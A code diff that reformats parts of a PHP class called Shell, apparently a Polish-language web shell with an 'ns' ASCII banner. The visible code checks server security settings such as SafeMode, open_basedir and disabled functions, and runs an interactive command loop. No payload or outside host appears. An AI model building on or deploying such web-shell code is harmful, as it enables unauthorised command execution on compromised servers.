@@ -281,7 +281,11 @@ class Shell
      */
     private function getStatus($bValue, $bNegative = FALSE)
     {
-        return sprintf('<span class="%s">%s</span>', (($bNegative ? !$bValue : $bValue) ? 'green' : 'red'), ($bValue ? 'TAK' : 'NIE'));
+        return sprintf(
+            '<span class="%s">%s</span>',
+            (($bNegative ? !$bValue : $bValue) ? 'green' : 'red'),
+            ($bValue ? 'TAK' : 'NIE')
+        );
     }
 
     /**
@@ -292,14 +296,14 @@ class Shell
      */
     private function getMenu()
     {
-        return sprintf('Wersja PHP: <strong>%s</strong><br/>' .
+        return sprintf(
+            'Wersja PHP: <strong>%s</strong><br/>' .
             'SafeMode: %s<br/>' .
             'OpenBaseDir: <strong>%s</strong><br/>' .
             'Serwer Api: <strong>%s</strong><br/>' .
             'Serwer: <strong>%s</strong><br/>' .
             'TMP: <strong>%s</strong><br/>' .
             'Zablokowane funkcje: <strong>%s</strong><br/>',
-
             phpversion(),
             $this->getStatus($this->oUtils->isSafeMode(), TRUE),
             ((($sBasedir = ini_get('open_basedir')) === '') ? $this->getStatus(0, TRUE) : $sBasedir),
@@ -501,13 +505,14 @@ class Shell
          * CLI
          */
         if (PHP_SAPI === 'cli') {
-            /**
-             * Naglowek
-             */
-            printf("\r\n   .  .          ,          __..     ..\r\n   |\ | _  _.._ -+- _ ._.  (__ |_  _ ||\r\n   | \|(/,(_][_) | (/,[    .__)[ )(/,||\r\n             |          v%s\r\n\r\n\r\n", self::VERSION);
+            print("\r\n");
+            print("   .  .          ,          __..     ..\r\n");
+            print("   |\ | _  _.._ -+- _ ._.  (__ |_  _ ||\r\n");
+            print("   | \|(/,(_][_) | (/,[    .__)[ )(/,||\r\n");
+            printf("             |          v%s\r\n\r\n", self::VERSION);
 
             if (count($GLOBALS['argv']) === 1) {
-                for (; ;) {
+                for (;;) {
                     printf('>> ns@127.0.0.1:%s$ ', getcwd());
                     echo $this->getCommandOutput(rtrim(fgets(STDIN)));
                 }
